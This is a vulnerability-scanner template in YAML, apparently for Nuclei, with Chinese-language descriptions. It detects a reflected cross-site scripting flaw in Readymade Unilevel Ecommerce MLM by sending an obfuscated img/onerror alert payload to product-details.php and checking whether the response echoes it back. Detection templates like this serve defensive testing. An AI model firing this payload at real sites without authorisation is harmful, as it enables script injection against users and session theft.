id: readymade-unilevel-xss

info:
  name: Readymade Unilevel Ecommerce MLM - 跨站脚本漏洞
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 Readymade Unilevel Ecommerce MLM - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}>` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html
  metadata:
    vendor: i-netsolution
    product: readymade-unilevel-ecommerce
  tags: ecommerce,readymade,xss,vuln

variables:
  num1: "{{rand_int(1000, 9999)}}"

http:
  - raw:
      - |
        GET /product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "><img/src/onerror=.1|alert`{{num1}}` class={{num1}}>", "user_login_id")'
          - 'contains(content_type, "text/html")'
          - "status_code == 200"
        condition: and
